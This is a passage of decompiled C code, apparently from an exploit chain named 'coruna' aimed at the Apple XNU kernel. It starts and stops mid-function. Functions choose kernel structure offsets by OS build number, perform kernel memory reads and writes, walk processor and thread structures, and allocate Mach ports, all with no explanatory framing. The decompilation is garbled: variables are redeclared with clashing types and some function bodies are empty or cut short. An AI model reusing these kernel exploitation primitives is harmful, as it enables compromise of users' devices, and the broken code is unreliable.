    if (err == 0x2258) {
      return 0xb4;
    }
  }
  else {
    if (err == 0x225c) {
      return 0xb4;
    }
    if (err == 0x2712) {
      return 200;
    }
  }
  return 0;
}





uint64_t coruna_slab_meta_offset(long handle)
{
  int err;
  bool err;
  uint64_t u;
  int status;
  
  u = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if ((err == 0x1809 || err == 0x1c1b) || err == 0x1f53) {
      return 0x48;
    }
  }
  else {
    if (err < 0x225c) {
      err = err == 0x1f54;
      status = 0x2258;
    }
    else {
      err = err == 0x2712;
      status = 0x225c;
    }
    if (err || err == status) {
      u = 0x40;
    }
  }
  return u;
}





uint64_t coruna_return_zero_29fc4(uint64_t val,long handle)
{
  uint u;
  int err;
  long handle;
  uint64_t scratch;
  long bootargs;
  
  u = coruna_return_zero_2ba94();
  if ((u != 0) && (err = coruna_kernel600c_residual_228(val,handle + (unsigned long)u,&bootargs), err != 0))
  {
    handle = coruna_ptr_canonicalize(val,bootargs);
    if (handle == 0) {
      return 0;
    }
    u = coruna_slab_meta_offset(val);
    if ((u != 0) &&
       (err = coruna_kernel600c_residual_228(val,bootargs + (unsigned long)u,&scratch), err != 0)) {
      handle = coruna_ptr_canonicalize(val,scratch);
      if (handle == 0) {
        return 0;
      }
      return scratch;
    }
  }
  return 0;
}





long coruna_kernel600c_via_return_zero_293c0_2(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long handle;
  long scratch;
  
  u = coruna_slab_meta_offset();
  if (u == 0) {
    handle = 0;
  }
  else {
    scratch = coruna_return_zero_293c0(val,id_2);
    handle = scratch;
    if (scratch != 0) {
      err = coruna_kernel600c_residual_228(val,scratch + (unsigned long)u,&scratch);
      handle = 0;
      if (err != 0) {
        handle = scratch;
      }
    }
  }
  return handle;
}





void coruna_kernel600c_via_ptr_canonicalize_5(uint *size,uint64_t val)
{
  uint u;
  long handle;
  uint64_t size;
  unsigned long version;
  uint port;
  unsigned long scratch;
  long bootargs;
  unsigned long thread_attr;
  unsigned long host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  thread_attr = 0;
  host_info = 0;
  handle = coruna_return_zero_29714(size,val,0);
  size = 0;
  if ((handle == 0) || (size = coruna_kernel600c_residual_228(size,handle + 0x78,&bootargs), (int)size == 0))
  if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
  ___stack_chk_fail(size);
  }
  return;
}





uint64_t coruna_kernel600c_via_kernel600c_via_ptr_canonicalize_5(long handle,uint32_t size)
{
  long handle;
  uint64_t u;
  
  handle = coruna_kernel600c_via_return_zero_28118();
  u = 0;
  if ((handle != 0) && (u = coruna_kernel600c_via_ptr_canonicalize_5(handle,handle), (int)u != 0)) {
    *(uint32_t *)(&k_kernel_slot_18f8 + handle) = size;
    u = 1;
  }
  return u;
}





long coruna_return_zero_2a3e0(long handle,uint64_t val,int flags)
{
  bool err;
  int err;
  long handle;
  long addr;
  long off;
  int status;
  unsigned long u;
  
  if (flags == 0) {
    handle = coruna_kernel600c_via_return_zero_28118();
    if (handle == 0) {
      return 0;
    }
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
      if (err - 0x1f53U < 2) {
        err = coruna_ctx_test_flag(handle,0x100000);
        if (err != 0) {
          off = 0x3ec;
          if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
            off = 0x41c;
          }
          return off + handle;
        }
        err = coruna_ctx_test_flag(handle,0x5584001);
        off = 0x3b8;
        if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          off = 1000;
        }
        addr = 0x3dc;
        if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          addr = 0x40c;
        }
        err = err == 0;
      }
      else {
        if (err != 0x1809) {
          if (err != 0x1c1b) {
            return 0;
          }
          u = *(unsigned long *)(handle + 0x158);
          err = coruna_ctx_test_flag(handle,0x5584001);
          off = 0x3d8;
          if (err != 0) {
            off = 0x3f4;
          }
          addr = 0x3e0;
          if (err != 0) {
            addr = 0x404;
          }
          if (0x1c1b19145fffff < u) {
            off = addr;
          }
          return off + handle;
        }
        err = coruna_ctx_test_flag(handle,0x5584001);
        err = err == 0;
        addr = 0x3c0;
        off = 0x3b8;
      }
    }
    else {
      if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
        return 0;
      }
      err = coruna_ctx_test_flag(handle,0x5100000);
      if (err != 0) {
        off = 0x3d0;
        return off + handle;
      }
      err = coruna_ctx_test_flag(handle,0x5584001);
      err = err == 0;
      addr = 0x3b8;
      off = 0x3a0;
    }
    if (!err) {
      off = addr;
    }
fail:
    return off + handle;
  }
  handle = coruna_return_zero_29df0();
  if (handle == 0) {
    return 0;
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    return handle + 0x78;
  }
  else {
    return handle + 0x78;
  }
  if (err != status) {
    return 0;
  }
done:
  return handle + 0x78;
}





long coruna_return_zero_2a5e0(long handle,uint64_t val,int flags,uint *size)
{
  int err;
  long handle;
  uint u;
  uint scratch;
  
  scratch = 0;
  handle = coruna_return_zero_2a3e0();
  if (handle == 0) {
    return 0;
  }
  err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,handle,&scratch);
  if (err == 0) {
    handle = 0;
  }
  else {
    if (*(int *)(handle + 0x140) < 0x1328) {
      u = scratch >> 0x18;
      if (u != 0) {
        handle = 0;
      }
    }
    else {
      u = scratch & 3;
      if (flags != 0) {
        if (u != 0) {
          handle = 0;
        }
      }
      else if (u != 3) {
        handle = 0;
      }
    }
    if (size != (uint *)0x0) {
      *size = scratch;
    }
  }
  return handle;
}





void coruna_call_macho_data_seg_2bb24_2bdb4_2a678(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_return_zero_2a5e0(val,id_2,0,size_3);
  return;
}





uint coruna_mach_port_deallocate_2a684(long handle,int flags,long addr_2,uint *size)
{
  uint u;
  int err;
  long handle;
  long addr;
  vm_size_t size;
  long off;
  uint size;
  uint8_t *ptr;
  uint version;
  unsigned long port;
  uint scratch;
  long bootargs;
  long thread_attr;
  mach_msg_type_number_t host_info;
  processor_array_t serial_buf;
  int action [6];
  
  serial_buf = (processor_array_t)0x0;
  host_info = 0;
  bootargs = 0;
  thread_attr = 0;
  err = *(int *)(handle + 0x140);
  {
  int use_fail = 0;
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err == 0x1809) {
        ptr = (uint8_t *)0x444;
        off = 0x20;
      }
      else {
        if (err != 0x1c1b) {
          return 0x28007;
        }
        off = 0x28;
        if (*(unsigned long *)(handle + 0x158) < 0x1c1b1401000000) {
          off = 0x20;
        }
        ptr = (uint8_t *)0x4b4;
      }
      use_fail = 1;
    }
  }
  else if ((err != 0x2258 && err != 0x225c) && err != 0x2712) {
    return 0x28007;
  }
  if (!use_fail) {
  err = coruna_ctx_test_flag(handle,0x4000000);
  ptr = (uint8_t *)0x8ac;
  if (err != 0) {
    ptr = &UNK_00003d3c;
  }
  if (0x1f52 < *(int *)(handle + 0x140)) {
    if (*(long *)(&k_kernel_slot_19f8 + handle) != 0) {
      coruna_macho_text_sect(action);
      off = coruna_strsep(action,"14 D9 33 F8",0,1);
      if (off != 0) {
        off = coruna_return_zero_15ca0_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),off + -8);
        if (off == 0) {
          return 0xad011;
        }
        u = coruna_cpu_core_count();
        if (u == 0) {
          version = 0;
        }
        else {
          size = 0;
          version = 0;
          host_info = u;
          do {
            err = coruna_kernel600c_residual_193(handle,off + (unsigned long)(*(int *)(handle + 0x168) * size),
                                 &thread_attr);
            if (err == 0) {
              return 0x2800f;
            }
            if (thread_attr == 0) {
              handle = 0;
            }
            else {
              addr = coruna_ptr_canonicalize(handle);
              handle = thread_attr;
              if (addr == 0) {
                return 0x28026;
              }
            }
            err = coruna_kernel600c_residual_193(handle,handle + 0x28,&bootargs);
            if (err == 0) {
              return 0x2800f;
            }
            handle = coruna_ptr_canonicalize(handle,bootargs);
            if (handle == 0) {
              return 0x28026;
            }
            err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,ptr + bootargs,action);
            if (err == 0) {
              return 0x2800f;
            }
            if (1 < action[0] - 1U) {
              return 0x28011;
            }
            if (action[0] == flags) {
              if (*size <= version) {
                return 0xad00c;
              }
              *(long *)(addr_2 + (unsigned long)version * 8) = thread_attr;
              version = version + 1;
            }
            size = size + 1;
          } while (size < u);
        }
        *size = version;
        return 0;
      }
    }
    return 0xad011;
  }
  }
  off = 0x28;
fail:
  u = _host_processors(*(host_priv_t *)(&k_kernel_slot_1920 + handle),&serial_buf,&host_info);
  if (u == 0) {
    if (host_info == 0) {
      version = 0;
    }
    else {
      port = 0;
      version = 0;
      scratch = 0x2800e;
      {
      int proc_exit = 0;
      do {
        handle = coruna_kernel600c_via_return_zero_28118(handle,serial_buf[port]);
        thread_attr = handle;
        u = scratch;
        if ((handle == 0) ||
           (err = coruna_kernel600c_residual_193(handle,handle + off,&bootargs), u = 0x2800f, err == 0)) {
          proc_exit = 1;
          break;
        }
        addr = coruna_ptr_canonicalize(handle,bootargs);
        if (addr == 0) {
          u = 0x28026;
          proc_exit = 1;
          break;
        }
        err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,ptr + bootargs,action);
        if (err == 0) {
          proc_exit = 1;
          break;
        }
        if (1 < action[0] - 1U) {
          u = 0x28011;
          proc_exit = 1;
          break;
        }
        if (action[0] == flags) {
          if (*size <= version) {
            u = 0xad00c;
            proc_exit = 1;
            break;
          }
          *(long *)(addr_2 + (unsigned long)version * 8) = handle;
          version = version + 1;
        }
        port = port + 1;
      } while (!proc_exit && port < host_info);
      }
    }
    *size = version;
    u = 0;
    ptr = k_kernel_mach_task_self_slot;
    if (host_info == 0) {
      size = 0;
    }
    else {
      port = 0;
      do {
        _mach_port_deallocate(*(ipc_space_t *)ptr,serial_buf[port]);
        port = port + 1;
      } while (port < host_info);
      size = (unsigned long)host_info << 2;
    }
    _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)serial_buf,size);
  }
  else {
    u = u | 0x80000000;
  }
  }
  return u;
}





uint64_t coruna_return_zero_2dae4(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x140);
  if (1 < err - 0x1f53U) {
    if (err == 0x1809) {
      return 0x58;
    }
    if (err != 0x1c1b) {
      return 0;
    }
  }
  return 0x60;
}





long coruna_return_zero_2af7c_2aa9c(long handle,long addr_2)
{
  int err;
  bool err;
  long handle;
  int status;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809 || err == 0x1c1b) {
      handle = 0x40;
    }
    else {
      if (err != 0x1f53) {
        return 0;
      }
      handle = 0x30;
    }
  }
  else {
    if (err < 0x225c) {
      err = err == 0x1f54;
      status = 0x2258;
    }
    else {
      err = err == 0x225c;
      status = 0x2712;
    }
    if (!err && err != status) {
      return 0;
    }
    handle = 0x20;
  }
  return handle + addr_2;
}





void coruna_kernel600c_via_return_zero_2af7c_2aa9c(uint64_t val,uint64_t id_2)
{
  long handle;
  
  handle = coruna_kernel600c_via_return_zero_290d4(val,*(uint32_t *)k_kernel_mach_task_self_slot,id_2);
  if (handle != 0) {
    coruna_return_zero_2af7c_2aa9c(val,handle);
    return;
  }
  return;
}





long coruna_kernel600c_via_kernel600c_via_return_zero_2af7c_2aa9c(uint64_t val)
{
  int err;
  long handle;
  long addr;
  long scratch;
  
  scratch = coruna_kernel600c_via_return_zero_2af7c_2aa9c();
  addr = scratch;
  if (scratch != 0) {
    err = coruna_kernel600c_residual_228(val,scratch,&scratch);
    if (err == 0) {
      addr = 0;
    }
    else {
      handle = coruna_ptr_canonicalize(val,scratch);
      addr = 0;
      if (handle != 0) {
        addr = scratch;
      }
    }
  }
  return addr;
}





long coruna_kernel600c_via_kernel600c_via_kernel600c_via_return_zero_2af7c_2aa9c(long handle)
{
  int err;
  long handle;
  unsigned long u;
  long scratch;
  
  scratch = coruna_kernel600c_via_kernel600c_via_return_zero_2af7c_2aa9c();
  if (scratch != 0) {
    u = *(unsigned long *)(handle + 0x158);
    if (u < 0x1c1b0a80100000) {
      handle = scratch + 0x18;
    }
    else {
      if (0x44a < u >> 0x2b) {
        return scratch + 0x50;
      }
      handle = 0x18;
      if (u < 0x1c1b1914600000) {
        handle = 0x20;
      }
      handle = handle + scratch;
    }
    err = coruna_kernel600c_residual_228(handle,handle,&scratch);
    if (err == 0) {
      scratch = 0;
    }
  }
  return scratch;
}





long coruna_return_zero_2ac70(long handle,int flags)
{
  int err;
  uint64_t u;
  long handle;
  long scratch;
  
  handle = *(long *)(handle + 0x1a8);
  if (handle == 0) {
    u = coruna_processor_set_default(handle);
    if ((int)u + 1U < 2) {
      return 0;
    }
    handle = coruna_kernel600c_via_return_zero_290d4(handle,*(uint32_t *)k_kernel_mach_task_self_slot,u);
    if (handle == 0) {
      return 0;
    }
    *(long *)(handle + 0x1a8) = handle;
  }
  if (flags == 1) {
    return handle;
  }
  handle = coruna_return_zero_28118(handle);
  if (handle == 0) {
    return 0;
  }
  err = coruna_kernel600c_residual_228(handle,handle + (unsigned long)(uint)(*(int *)(handle + 0x168) * flags) + 0x10,
                       &scratch);
  if (err != 0) {
    return scratch;
  }
  return 0;
}





uint64_t coruna_kernel600c_via_ptr_canonicalize_6(long handle,uint64_t val,uint64_t *id_2)
{
  int err;
  long handle;
  uint64_t u;
  uint64_t scratch;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f53) {
    if (err != 0x1809 && err != 0x1c1b) {
      return 0x28007;
    }
  }
  else if (1 < err - 0x1f53U && err != 0x2258) {
    return 0x28007;
  }
  handle = coruna_kernel600c_via_return_zero_28118(handle);
  if (handle == 0) {
    u = 0x28025;
  }
  else {
    err = coruna_kernel600c_residual_228(handle,handle + 0x38,&scratch);
    if (err == 0) {
      u = 0x2800f;
    }
    else {
      handle = coruna_ptr_canonicalize(handle,scratch);
      if (handle == 0) {
        u = 0x28026;
      }
      else {
        u = 0;
        *id_2 = scratch;
      }
    }
  }
  return u;
}





uint64_t coruna_kernel600c_via_ptr_canonicalize_7(long handle,int flags,uint64_t *val)
{
  int err;
  long handle;
  int status;
  long addr;
  uint64_t scratch;
  long bootargs;
  long thread_attr;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
fail:
      addr = 0xf8;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        addr = 0x100;
      }
      {
        handle = coruna_kernel600c_via_return_zero_28a34(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
        if (handle == 0) {
        return 0x2800e;
        }
        err = coruna_kernel600c_residual_228(handle,handle + addr,&thread_attr);
        if (err == 0) {
        return 0x2800f;
        }
        addr = coruna_ptr_canonicalize(handle,thread_attr);
        if (addr != 0) {
        if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
        err = coruna_kernel600c_residual_228(handle,thread_attr,&bootargs);
        if (err == 0) {
        return 0x2800f;
        }
        addr = coruna_ptr_canonicalize(handle,bootargs);
        if (addr == 0) {
        return 0x28026;
        }
        }
        else {
        bootargs = thread_attr;
        }
        err = coruna_kernel600c_residual_228(handle,bootargs + (long)*(int *)(handle + 0x168) * (long)flags,
        &scratch);
        if (err == 0) {
        return 0x2800f;
        }
        addr = coruna_ptr_canonicalize(handle,scratch);
        if (addr != 0) {
        *val = scratch;
        return 0;
        }
        }
        return 0x28026;
      }
    }
    if (err == 0x1809) {
      addr = 0x108;
      {
        handle = coruna_kernel600c_via_return_zero_28a34(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
        if (handle == 0) {
        return 0x2800e;
        }
        err = coruna_kernel600c_residual_228(handle,handle + addr,&thread_attr);
        if (err == 0) {
        return 0x2800f;
        }
        addr = coruna_ptr_canonicalize(handle,thread_attr);
        if (addr != 0) {
        if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
        err = coruna_kernel600c_residual_228(handle,thread_attr,&bootargs);
        if (err == 0) {
        return 0x2800f;
        }
        addr = coruna_ptr_canonicalize(handle,bootargs);
        if (addr == 0) {
        return 0x28026;
        }
        }
        else {
        bootargs = thread_attr;
        }
        err = coruna_kernel600c_residual_228(handle,bootargs + (long)*(int *)(handle + 0x168) * (long)flags,
        &scratch);
        if (err == 0) {
        return 0x2800f;
        }
        addr = coruna_ptr_canonicalize(handle,scratch);
        if (addr != 0) {
        *val = scratch;
        return 0;
        }
        }
        return 0x28026;
      }
    }
    status = 0x1c1b;
  }
  else {
    {
      addr = 0xf8;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      addr = 0x100;
      }
      {
      handle = coruna_kernel600c_via_return_zero_28a34(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
      if (handle == 0) {
      return 0x2800e;
      }
      err = coruna_kernel600c_residual_228(handle,handle + addr,&thread_attr);
      if (err == 0) {
      return 0x2800f;
      }
      addr = coruna_ptr_canonicalize(handle,thread_attr);
      if (addr != 0) {
      if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
      err = coruna_kernel600c_residual_228(handle,thread_attr,&bootargs);
      if (err == 0) {
      return 0x2800f;
      }
      addr = coruna_ptr_canonicalize(handle,bootargs);
      if (addr == 0) {
      return 0x28026;
      }
      }
      else {
      bootargs = thread_attr;
      }
      err = coruna_kernel600c_residual_228(handle,bootargs + (long)*(int *)(handle + 0x168) * (long)flags,
      &scratch);
      if (err == 0) {
      return 0x2800f;
      }
      addr = coruna_ptr_canonicalize(handle,scratch);
      if (addr != 0) {
      *val = scratch;
      return 0;
      }
      }
      return 0x28026;
      }
    }
    status = 0x2712;
  }
  if (err != status) {
    return 0x2802c;
  }
  addr = 0xf8;
code_r0x0002aeac:
  handle = coruna_kernel600c_via_return_zero_28a34(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
  if (handle == 0) {
    return 0x2800e;
  }
  err = coruna_kernel600c_residual_228(handle,handle + addr,&thread_attr);
  if (err == 0) {
    return 0x2800f;
  }
  addr = coruna_ptr_canonicalize(handle,thread_attr);
  if (addr != 0) {
    if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
      err = coruna_kernel600c_residual_228(handle,thread_attr,&bootargs);
      if (err == 0) {
        return 0x2800f;
      }
      addr = coruna_ptr_canonicalize(handle,bootargs);
      if (addr == 0) {
        return 0x28026;
      }
    }
    else {
      bootargs = thread_attr;
    }
    err = coruna_kernel600c_residual_228(handle,bootargs + (long)*(int *)(handle + 0x168) * (long)flags,
                         &scratch);
    if (err == 0) {
      return 0x2800f;
    }
    addr = coruna_ptr_canonicalize(handle,scratch);
    if (addr != 0) {
      *val = scratch;
      return 0;
    }
  }
  return 0x28026;
}





uint64_t coruna_kernel600c_via_ptr_canonicalize_8(long handle,uint64_t val,uint64_t *id_2)
{
  bool err;
  int err;
  uint64_t u;
  long handle;
  int status;
  uint64_t scratch;
  long bootargs;
  long thread_attr;
  
  err = *(int *)(handle + 0x140);
  u = 0x2802c;
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  if ((err || err == status) &&
     (u = coruna_kernel600c_via_ptr_canonicalize_7(handle,val,&thread_attr), (int)u == 0)) {
    err = coruna_kernel600c_residual_228(handle,thread_attr + 0x10,&bootargs);
    if (err == 0) {
      u = 0x2800f;
    }
    else {
      handle = coruna_ptr_canonicalize(handle,bootargs);
      if (handle != 0) {
        err = coruna_kernel600c_residual_228(handle,bootargs + 0x38,&scratch);
        if (err == 0) {
          return 0x2800f;
        }
        handle = coruna_ptr_canonicalize(handle,scratch);
        if (handle != 0) {
          *id_2 = scratch;
          return 0;
        }
      }
      u = 0x28026;
    }
  }
  return u;
}





uint64_t coruna_kernel600c_via_ctx_test_flag_14(long handle,int flags,uint32_t *size)
{
  int err;
  uint64_t u;
  
  if (flags == 0) {
    err = coruna_ctx_test_flag(handle,8);
    if (err == 0) {
      u = 0xffffffe000000000;
      if (0x225814018fffff < *(unsigned long *)(handle + 0x158)) {
        err = coruna_ctx_test_flag(handle,0x2000);
        u = 0xffffffdc00000000;
        if (err != 0) {
          u = 0xffffffe000000000;
        }
      }
    }
    else {
      u = 0xfffffe0000000000;
    }
    *size = 6;
  }
  else {
    u = 0;
  }
  return u;
}





void coruna_pthread_attr_setdetachstate(uint *size,uint flags_2,uint *count_3)
{
  long *ptr;
  unsigned long u;
  uint size;
  int err;
  uint *ptr;
  void **lppv6;
  long handle;
  unsigned long version;
  long addr;
  uint *scratch;
  uint bootargs;
  uint32_t thread_attr;
  pthread_t host_info;
  pthread_attr_t serial_buf;
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  ptr = size;
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
  return;
  }
  ___stack_chk_fail(ptr);
}





unsigned long coruna_kernel600c_via_kernel600c_via_kernel600c_via_fd_read_full_2(uint64_t arg,uint64_t val,int n)

{
  int fd_11;
  long base;
  unsigned long u;
  uint cache_81;
  
  base = coruna_return_zero_2b0c0_28280();
  u = 0;
  if ((base != 0) && (u = coruna_kernel600c_via_kernel600c_via_fd_read_full(arg,base,&cache_81), (int)u != 0)) {
    if (cache_81 < 0x80000001) {
      fd_11 = coruna_mach_vm_machine_attribute(arg,base,cache_81 + n);
      u = (unsigned long)(fd_11 != 0);
    }
    else {
      u = 0;
    }
  }
  return u;
}





unsigned long coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_1e994_2(uint64_t arg,long val,int n)

{
  int fd_11;
  unsigned long type_id_17;
  int cache_81;
  
  type_id_17 = coruna_call_mach_vm_machine_attribute_29df8_1c57c(arg,val + 4,4,&cache_81);
  if ((int)type_id_17 != 0) {
    cache_81 = cache_81 + n;
    fd_11 = coruna_call_mach_vm_machine_attribute_29df8_1e994(arg,val + 4,&cache_81,4);
    type_id_17 = (unsigned long)(fd_11 != 0);
  }
  return type_id_17;
}





uint64_t coruna_kernel600c_via_kernel600c_via_call_mach_vm_machine_attribute_29df8_1e994_2(uint64_t val,uint64_t id_2)
{
  coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_1e994_2(val,id_2,1);
  coruna_kernel600c_via_kernel600c_via_kernel600c_via_fd_read_full_2(val,id_2,1);
  return 0;
}





uint64_t coruna_return_zero_2b4e0(long handle,long addr_2,int flags)
{
  uint64_t u;
  long handle;
  long scratch;
  int bootargs;
  
  u = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,addr_2 + 0x10,&bootargs);
  if ((int)u == 0) {
    return u;
  }
  if (bootargs - 1U >> 0x14 == 0) {
    u = coruna_kernel600c_via_mach_vm_machine_attribute(handle,addr_2 + 0x10,bootargs + flags);
    if ((int)u == 0) {
      return u;
    }
    if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
      u = coruna_kernel600c_residual_228(handle,addr_2,&scratch);
      if ((int)u == 0) {
        return u;
      }
      handle = coruna_ptr_canonicalize(handle,scratch);
      if (handle == 0) {
        return 0;
      }
      handle = 0;
      if (*(int *)(handle + 0x140) < 0x2712) {
        handle = 0x18;
      }
      u = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,handle + scratch,&bootargs);
      if ((int)u == 0) {
        return u;
      }
      if (bootargs - 1U >> 0x14 != 0) goto fail;
      u = coruna_mach_vm_machine_attribute(handle,scratch + handle,bootargs + flags);
      if ((int)u == 0) {
        return u;
      }
    }
    u = 1;
  }
  else {
fail:
    u = 0;
  }
  return u;
}





uint32_t coruna_kernel600c_via_return_zero_2b4e0(uint64_t val,uint64_t id_2)
{
  int err;
  uint32_t u;
  
  err = coruna_return_zero_2b4e0(val,id_2,0x10);
  u = 0x1001;
  if (err != 0) {
    u = 0;
  }
  return u;
}





void coruna_ctx_set_flag(uint *size,uint flags_2)
{
  *size = *size | flags_2;
  return;
}





void coruna_ctx_clear_flag(uint *size,uint flags_2)
{
  *size = *size & (flags_2 ^ 0xffffffff);
  return;
}





bool coruna_ctx_test_flag(uint *size,uint flags_2)
{
  return (*size & flags_2) != 0;
}





long coruna_return_zero_2b63c(long handle)
{
  int err;
  long handle;
  uint32_t scratch;
  long bootargs;
  
  bootargs = 0;
  if (*(long *)(handle + 0x210) != 0) {
    return *(long *)(handle + 0x210);
  }
  if (*(long *)(&k_kernel_slot_19d0 + handle) != 0) {
    handle = coruna_return_zero_2b0c0(handle);
    if (handle == 0) {
      return 0;
    }
    err = coruna_kernel600c_residual_228(handle,handle,&bootargs);
    if (err != 0) {
      if (bootargs == 0) {
        scratch = 0x200;
        bootargs = coruna_vm_deallocate_2ced4(handle,&scratch);
        if (bootargs == 0) {
          return 0;
        }
        err = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(handle,handle,bootargs);
        if (err == 0) {
          return 0;
        }
      }
      else {
        handle = coruna_ptr_canonicalize(handle);
        if (handle == 0) {
          return 0;
        }
      }
      *(long *)(handle + 0x210) = bootargs;
      return bootargs;
    }
  }
  return 0;
}





uint64_t coruna_kernel600c_via_return_zero_2b63c(long handle,uint size,long *addr_2)
{
  uint64_t u;
  long scratch;
  
  if (size < 0xe) {
    scratch = coruna_return_zero_2b63c();
    u = 0;
    if ((scratch != 0) &&
       (u = coruna_kernel600c_residual_228(handle,scratch + (unsigned long)(*(int *)(handle + 0x168) * size),
                             &scratch), (int)u != 0)) {
      *addr_2 = scratch;
      u = 1;
    }
  }
  else {
    u = 0;
  }
  return u;
}





uint64_t coruna_kernel600c_via_return_zero_2b63c_2(long handle,uint size,uint64_t val)
{
  int err;
  uint64_t u;
  long handle;
  uint64_t scratch;
  
  if (size < 0xe) {
    err = *(int *)(handle + 0x168);
    scratch = val;
    handle = coruna_return_zero_2b63c();
    u = 0;
    if (handle != 0) {
      u = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,handle + (unsigned long)(err * size),&scratch,err);
    }
  }
  else {
    u = 0;
  }
  return u;
}
bool coruna_host_create_mach_voucher(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  mach_port_t lm1;
  int err;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  scratch = k_kernel_rodata_word_000377c8;
  scratch = k_kernel_rodata_word_377c0;
  bootargs = id_2;
  lm1 = _mach_host_self();
  err = _host_create_mach_voucher(lm1,&scratch,0x18,size_3);
  return err == 0;
}





uint coruna_proc_pidinfo(uint64_t val,uint64_t id_2)
{
  pid_t pid;
  int err;
  uint u;
  uint size;
  int *err;
  uint *ptr;
  uint64_t scratch;
  
  scratch = 0;
  pid = _getpid();
  err = _proc_pidinfo(pid,0x20,0,&scratch,8);
  if (err == 8) {
    if ((uint)scratch < (uint)id_2) {
      u = coruna_mach_port_insert_right_2b8b0(id_2);
      size = 0;
      if (u != 0) {
        size = u | 0x80000000;
      }
    }
    else {
      size = 0;
    }
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    size = -*ptr;
    if (-1 < err) {
      size = *ptr;
    }
    size = size | 0x40000000;
  }
  return size;
}





kern_return_t coruna_mach_port_insert_right_2b8b0(int flags)
{
  uint name;
  uint8_t *ptr;
  kern_return_t lk2;
  kern_return_t lk3;
  mach_port_name_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  lk2 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch);
  if (lk2 == 0) {
    name = flags << 8 | 3;
    lk3 = _mach_port_insert_right(*(ipc_space_t *)ptr,name,scratch,0x15);
    if (lk3 == 0) {
      _mach_port_deallocate(*(ipc_space_t *)ptr,name);
      lk2 = 0;
    }
    else {
      lk2 = 0;
      if (lk3 != 0xd) {
        lk2 = lk3;
      }
    }
  }
  if (1 < scratch + 1) {
    _mach_port_mod_refs(*(ipc_space_t *)ptr,scratch,1,-1);
  }
  return lk2;
}





uint coruna_proc_pidinfo_2b960(uint64_t val,uint size)
{
  pid_t pid;
  int err;
  uint u;
  uint size;
  int *err;
  uint *ptr;
  uint64_t scratch;
  
  scratch = 0;
  pid = _getpid();
  err = _proc_pidinfo(pid,0x20,0,&scratch,8);
  if (err == 8) {
    if (scratch < size) {
      u = coruna_mach_port_insert_right_2b8b0((size - scratch) + (int)scratch);
      size = 0;
      if (u != 0) {
        size = u | 0x80000000;
      }
    }
    else {
      size = 0;
    }
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    size = -*ptr;
    if (-1 < err) {
      size = *ptr;
    }
    size = size | 0x40000000;
  }
  return size;
}





uint8_t * coruna_mach_port_request_notification(long handle,long addr_2,mach_port_name_t *arg)
{
  ipc_space_t task;
  uint u;
  uint8_t *ptr;
  mach_port_t poly;
  bool err;
  int err;
  uint size;
  uint version;
  int status;
  uint64_t port;
  uint8_t *buf;
  long handle;
  long addr;
  mach_port_name_t lm12;
  uint8_t *str;
  uint scratch;
  long bootargs;
  uint64_t thread_attr;
  long host_info;
  uint64_t serial_buf;
  vm_address_t action;
  
  size = 0x28010;
  action = action & 0xffffffff00000000;
  err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,addr_2,&action);
  version = 0;
  if (-1 < (int)(uint)action) {
    version = 0x28008;
  }
  str = (uint8_t *)0x2800f;
  u = 0x2800f;
  if (err != 0) {
    u = version;
  }
  if (err == 0) {
    return (uint8_t *)(unsigned long)u;
  }
  if (-1 < (int)(uint)action) {
    return (uint8_t *)(unsigned long)u;
  }
  if (0x1f52ffffffffff < *(unsigned long *)(handle + 0x158)) {
    version = 0x200000;
    if (*(unsigned long *)(handle + 0x158) < 0x1f541900000000) {
      version = 0x400000;
    }
